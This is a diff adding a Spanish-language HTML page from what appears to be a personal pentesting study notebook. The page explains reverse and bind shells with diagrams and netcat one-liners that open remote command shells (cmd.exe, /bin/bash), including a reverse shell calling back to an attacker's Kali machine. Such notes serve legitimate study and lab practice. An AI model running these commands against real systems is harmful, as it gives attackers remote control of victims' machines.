@@ -1,0 +1,80 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Reverse vs Bind | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="reverse-vs-bind">
+          <div class="note-tabbar">
+            <span>Reverse vs Bind</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Shells</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">shells</p>
+            <h2>Reverse vs Bind</h2>
+
+            <h3>Reverse Shell</h3>
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/shells/reverse-vs-bind/pasted-image-20251021143211.png" alt="Diagrama de reverse shell" />
+            </figure>
+            <section class="code-card">
+              <h3>Reverse Shell</h3>
+              <pre><code># Atacante Linux
+nc -nvlp 1234
+# Target Windows
+./nc.exe -nv &lt;Kali_Machine_IP_address&gt; 1234 -e cmd.exe</code></pre>
+            </section>
+            <h3>Bind Shell</h3>
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/shells/reverse-vs-bind/pasted-image-20251021143233.png" alt="Diagrama de bind shell" />
+            </figure>
+            <section class="code-card">
+              <h3>Bind Shell</h3>
+              <pre><code># Target Windows
+nc.exe -nvlp 1234 -e cmd.exe
+
+# Atacante Linux
+nc -nv 10.0.23.27 1234</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Bind Shell</h3>
+              <pre><code># Target Linux
+nc -nvlp 1234 -e /bin/bash
+
+# Attacker Windows
+nc.exe -nv 10.10.31.2 1234</code></pre>
+            </section>
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>shells</span>
+              <span>reverse_vs_bind</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
